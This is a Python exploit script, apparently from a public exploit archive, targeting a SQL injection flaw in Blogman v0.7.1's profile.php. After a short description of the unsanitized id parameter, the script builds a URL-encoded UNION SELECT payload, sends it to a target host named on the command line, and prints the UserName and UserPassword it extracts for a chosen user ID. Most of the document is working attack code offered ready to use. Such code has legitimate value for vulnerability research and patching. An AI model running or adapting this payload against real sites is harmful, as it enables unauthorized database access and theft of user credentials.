Blogman v0.7.1 (profile.php) SQL Injection Exploit
==================================================

#!/usr/bin/python
#
# Exploit Title:   Blogman v0.7.1 (profile.php) SQL Injection Exploit
# Date         :   28 August 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/blogman/
# Version      :   0.7.1
# Tested on    :   EasyPHP 5.3.1.0 for Windows
#
#
# Description
# ===========
#
# + profile.php => SQL Injection!!
#
# 6:    $query = "SELECT * FROM ".$GLOBALS[&#039;dbTablePrefix&#039;]."user WHERE
#       UserID=&#039;".$_GET[&#039;id&#039;]."&#039;";
# 7:    $profileuser = mysql_fetch_array(mysql_query($query));
#
# + profile.php => The query showed above returns a 16-columns table. UserName,
#   which is the 2nd column&#039;s name, is used few line after the query to display
#   the information extracted.
#
# 12:   echo $profileuser[&#039;UserName&#039;]."</p>\n";
#
 
import re
import sys
import http.client
import urllib.parse
 
 
def usage(prog):
    print(&#039;Usage  : &#039; + prog + &#039; <target> <path> <user_id>\n&#039;)
    print(&#039;Example: &#039; + prog + &#039; localhost /blogman/ 2&#039;)
    print(&#039;         &#039; + prog + &#039; www.example.com /complete/path/ 1&#039;)
    return
 
 
def exploit(target, path, userid):
    payload  = &#039;profile.php?id=-1%27%20UNION%20SELECT%20NULL,%20CONCAT(%27%3C1&#039;
    payload += &#039;%3E%27,UserName,%27:%27,UserPassword,%27%3C2%3E%27),%20NULL,%20&#039;
    payload += &#039;NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,&#039;
    payload += &#039;%20NULL,%20NULL,%20NULL,%20NULL,%20NULL%20FROM%20blogman_user&#039;
    payload += &#039;%20WHERE%20UserID=%27&#039; + str(userid) + &#039;%27%20--%20%27&#039;
 
    print(&#039;[+] Sending HTTP Request&#039;)
    con = http.client.HTTPConnection(target)
    con.request(&#039;GET&#039;, path + payload)
    res = con.getresponse()
     
    if res.status != 200:
        print(&#039;[!] HTTP GET request failed.&#039;)
        exit(1)
 
    print(&#039;[+] Parsing HTTP Response&#039;)
    data = res.read().decode()
    pattern = re.compile(r"<1>(.+?)<2>", re.M)
    m = pattern.search(data)
 
    if m:
        print(&#039;[+] Information Extracted:\n&#039;)
        print(m.group()[3:-3])
    else:
        print(&#039;[!] No information found&#039;)
         
    return
 
 
print(&#039;\n+-----------------------------------------------------------------------+&#039;)
print(&#039;| Blogman v0.7.1 (profile.php) SQL Injection Exploit by Ptrace Security |&#039;)
print(&#039;+-----------------------------------------------------------------------+\n&#039;)
 
if len(sys.argv) != 4:
    usage(sys.argv[0])
else:
    exploit(sys.argv[1], sys.argv[2], sys.argv[3])
 
exit(0)



